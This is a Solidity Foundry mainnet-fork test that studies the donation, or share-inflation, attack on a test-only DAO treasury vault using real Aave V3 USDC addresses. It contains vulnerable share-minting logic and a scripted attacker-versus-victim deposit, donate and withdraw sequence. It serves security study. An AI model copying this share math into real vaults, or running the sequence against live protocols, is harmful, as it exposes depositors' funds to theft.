// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {IYieldProtocol} from "../src/interfaces/IYieldProtocol.sol";
import {IAavePool} from "../src/interfaces/IAavePool.sol";
import {IAToken} from "../src/interfaces/IAToken.sol";

import {AaveYieldAdapter} from "../src/adapters/AaveYieldAdapter.sol";


// ================================================================
// TEST-ONLY TREASURY
// ================================================================
//
// IMPORTANT:
// This contract is ONLY for testing.
//
// DO NOT deploy this contract.
//
// It is used to study the donation / inflation attack.
// ================================================================

contract DAOTreasuryYieldManagerV2FixedForTest {

    using SafeERC20 for IERC20;

    IERC20 public immutable asset;
    IYieldProtocol public immutable protocol;

    mapping(address => uint256) public shares;

    uint256 public totalShares;


    constructor(
        IERC20 _asset,
        IYieldProtocol _protocol
    ) {
        asset = _asset;
        protocol = _protocol;
    }


    // ============================================================
    // TOTAL ASSETS
    // ============================================================

    function totalAssets()
        public
        view
        returns (uint256)
    {
        return
            asset.balanceOf(address(this))
            + protocol.totalAssets();
    }


    // ============================================================
    // DEPOSIT
    // ============================================================

    function deposit(uint256 amount)
        external
    {
        require(
            amount > 0,
            "Zero deposit"
        );

        uint256 assetsBefore =
            totalAssets();

        asset.safeTransferFrom(
            msg.sender,
            address(this),
            amount
        );

        uint256 sharesToMint;

        if (totalShares == 0) {

            sharesToMint =
                amount;

        } else {

            sharesToMint =
                (amount * totalShares)
                / assetsBefore;
        }

        require(
            sharesToMint > 0,
            "Zero shares"
        );

        shares[msg.sender] +=
            sharesToMint;

        totalShares +=
            sharesToMint;

        asset.forceApprove(
            address(protocol),
            amount
        );

        protocol.deposit(
            amount
        );
    }


    // ============================================================
    // WITHDRAW
    // ============================================================

    function withdraw()
        external
    {
        uint256 userShares =
            shares[msg.sender];

        require(
            userShares > 0,
            "No shares"
        );

        uint256 assets =
            totalAssets();

        uint256 amount =
            (userShares * assets)
            / totalShares;


        // --------------------------------------------------------
        // EFFECTS FIRST
        // --------------------------------------------------------

        shares[msg.sender] = 0;

        totalShares -=
            userShares;


        // --------------------------------------------------------
        // USE IDLE TREASURY ASSETS FIRST
        // --------------------------------------------------------

        uint256 idleAssets =
            asset.balanceOf(address(this));

        if (amount > idleAssets) {

            uint256 remaining =
                amount - idleAssets;

            protocol.withdraw(
                remaining
            );
        }


        // --------------------------------------------------------
        // SEND USER ASSETS
        // --------------------------------------------------------

        asset.safeTransfer(
            msg.sender,
            amount
        );
    }
}


// ================================================================
// MAINNET FORK TEST
// ================================================================

contract DAOTreasuryYieldManagerV2MainnetForkTest is Test {

    // ============================================================
    // REAL ETHEREUM MAINNET AAVE V3 USDC
    // ============================================================

    address constant USDC =
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address constant AAVE_POOL =
        0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    address constant AUSDC =
        0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c;


    // ============================================================
    // TEST USERS
    // ============================================================

    IERC20 public usdc;

    address public attacker;
    address public victim;


    // ============================================================
    // TEST CONTRACTS
    // ============================================================

    AaveYieldAdapter public adapter;

    DAOTreasuryYieldManagerV2FixedForTest public treasury;


    // ============================================================
    // ATTACK PARAMETERS
    // ============================================================

    uint256 public attackerDeposit;

    uint256 public donation;

    uint256 public victimDeposit;


    // ============================================================
    // RECORDED RESULTS
    // ============================================================

    uint256 public attackerShares;

    uint256 public victimShares;

    uint256 public attackerReceived;

    uint256 public victimReceived;

    uint256 public attackerContribution;

    uint256 public attackerProfit;

    uint256 public attackerLoss;

    uint256 public victimGain;

    uint256 public victimLoss;


    // ============================================================
    // SETUP
    // ============================================================

    function setUp()
        public
    {
        usdc =
            IERC20(USDC);

        attacker =
            makeAddr("attacker");

        victim =
            makeAddr("victim");
    }


    // ============================================================
    // MAIN TEST
    // ============================================================
    //
    // Attack:
    //
    // Attacker deposits   $1
    // Attacker donates    $1,000
    // Victim deposits     $10,000
    //
    // Then both withdraw.
    //
    // We compare attacker profit/loss against victim loss/gain.
    // ============================================================

    function test_AttackerProfitVsVictimLoss()
        public
    {
        // --------------------------------------------------------
        // PARAMETERS
        // --------------------------------------------------------

        attackerDeposit =
            1e6;

        donation =
            1000e6;

        victimDeposit =
            10000e6;


        // --------------------------------------------------------
        // DEPLOY AAVE ADAPTER
        // --------------------------------------------------------

        adapter =
            new AaveYieldAdapter(
                usdc,
                IAavePool(AAVE_POOL),
                IAToken(AUSDC)
            );


        // --------------------------------------------------------
        // DEPLOY TEST TREASURY
        // --------------------------------------------------------

        treasury =
            new DAOTreasuryYieldManagerV2FixedForTest(
                usdc,
                adapter
            );


        // --------------------------------------------------------
        // CONNECT ADAPTER TO TREASURY
        // --------------------------------------------------------

        adapter.setTreasury(
            address(treasury)
        );


        // --------------------------------------------------------
        // FUND ATTACKER
        // --------------------------------------------------------

        deal(
            USDC,
            attacker,
            attackerDeposit + donation
        );


        // --------------------------------------------------------
        // FUND VICTIM
        // --------------------------------------------------------

        deal(
            USDC,
            victim,
            victimDeposit
        );


        // --------------------------------------------------------
        // STEP 1
        // ATTACKER DEPOSITS $1
        // --------------------------------------------------------

        _attackerDeposit();


        // --------------------------------------------------------
        // STEP 2
        // ATTACKER DONATES $1000
        // --------------------------------------------------------

        _attackerDonate();


        // --------------------------------------------------------
        // STEP 3
        // VICTIM DEPOSITS $10000
        // --------------------------------------------------------

        _victimDeposit();


        // --------------------------------------------------------
        // RECORD SHARES
        // --------------------------------------------------------

        attackerShares =
            treasury.shares(attacker);

        victimShares =
            treasury.shares(victim);


        // --------------------------------------------------------
        // SHOW STATE BEFORE WITHDRAWALS
        // --------------------------------------------------------

        console2.log("");
        console2.log(
            "========================================"
        );

        console2.log(
            "ATTACKER VS VICTIM"
        );

        console2.log(
            "========================================"
        );

        console2.log(
            "Attacker deposit:",
            attackerDeposit
        );

        console2.log(
            "Attacker donation:",
            donation
        );

        console2.log(
            "Victim deposit:",
            victimDeposit
        );

        console2.log(
            "Attacker shares:",
            attackerShares
        );

        console2.log(
            "Victim shares:",
            victimShares
        );

        console2.log(
            "Treasury assets before withdrawals:",
            treasury.totalAssets()
        );


        // --------------------------------------------------------
        // STEP 4
        // ATTACKER WITHDRAWS
        // --------------------------------------------------------

        _attackerWithdraw();


        // --------------------------------------------------------
        // STEP 5
        // VICTIM WITHDRAWS
        // --------------------------------------------------------

        _victimWithdraw();


        // --------------------------------------------------------
        // CALCULATE ATTACKER ECONOMICS
        // --------------------------------------------------------

        attackerContribution =
            attackerDeposit + donation;


        if (
            attackerReceived >
            attackerContribution
        ) {

            attackerProfit =
                attackerReceived
                - attackerContribution;

            attackerLoss = 0;

        } else {

            attackerProfit = 0;

            attackerLoss =
                attackerContribution
                - attackerReceived;
        }


        // --------------------------------------------------------
        // CALCULATE VICTIM ECONOMICS
        // --------------------------------------------------------

        if (
            victimReceived >
            victimDeposit
        ) {

            victimGain =
                victimReceived
                - victimDeposit;

            victimLoss = 0;

        } else {

            victimGain = 0;

            victimLoss =
                victimDeposit
                - victimReceived;
        }


        // --------------------------------------------------------
        // PRINT FINAL RESULTS
        // --------------------------------------------------------

        console2.log(
            "========================================"
        );

        console2.log(
            "Attacker contribution:",
            attackerContribution
        );

        console2.log(
            "Attacker received:",
            attackerReceived
        );

        console2.log(
            "Attacker profit:",
            attackerProfit
        );

        console2.log(
            "Attacker loss:",
            attackerLoss
        );

        console2.log(
            "----------------------------------------"
        );

        console2.log(
            "Victim deposited:",
            victimDeposit
        );

        console2.log(
            "Victim received:",
            victimReceived
        );

        console2.log(
            "Victim gain:",
            victimGain
        );

        console2.log(
            "Victim loss:",
            victimLoss
        );

        console2.log(
            "----------------------------------------"
        );

        console2.log(
            "Treasury final assets:",
            treasury.totalAssets()
        );

        console2.log(
            "========================================"
        );


        // --------------------------------------------------------
        // SECURITY CHECKS
        // --------------------------------------------------------

        assertEq(
            treasury.shares(attacker),
            0
        );

        assertEq(
            treasury.shares(victim),
            0
        );

        assertEq(
            treasury.totalShares(),
            0
        );

        assertEq(
            treasury.totalAssets(),
            0
        );
    }


    // ============================================================
    // ATTACKER DEPOSIT
    // ============================================================

    function _attackerDeposit()
        internal
    {
        vm.startPrank(attacker);

        usdc.approve(
            address(treasury),
            attackerDeposit
        );

        treasury.deposit(
            attackerDeposit
        );

        vm.stopPrank();
    }


    // ============================================================
    // ATTACKER DONATION
    // ============================================================

    function _attackerDonate()
        internal
    {
        vm.prank(attacker);

        usdc.transfer(
            address(treasury),
            donation
        );
    }


    // ============================================================
    // VICTIM DEPOSIT
    // ============================================================

    function _victimDeposit()
        internal
    {
        vm.startPrank(victim);

        usdc.approve(
            address(treasury),
            victimDeposit
        );

        treasury.deposit(
            victimDeposit
        );

        vm.stopPrank();
    }


    // ============================================================
    // ATTACKER WITHDRAW
    // ============================================================

    function _attackerWithdraw()
        internal
    {
        uint256 beforeBalance =
            usdc.balanceOf(attacker);

        vm.prank(attacker);

        treasury.withdraw();

        uint256 afterBalance =
            usdc.balanceOf(attacker);

        attackerReceived =
            afterBalance
            - beforeBalance;
    }


    // ============================================================
    // VICTIM WITHDRAW
    // ============================================================

    function _victimWithdraw()
        internal
    {
        uint256 beforeBalance =
            usdc.balanceOf(victim);

        vm.prank(victim);

        treasury.withdraw();

        uint256 afterBalance =
            usdc.balanceOf(victim);

        victimReceived =
            afterBalance
            - beforeBalance;
    }
}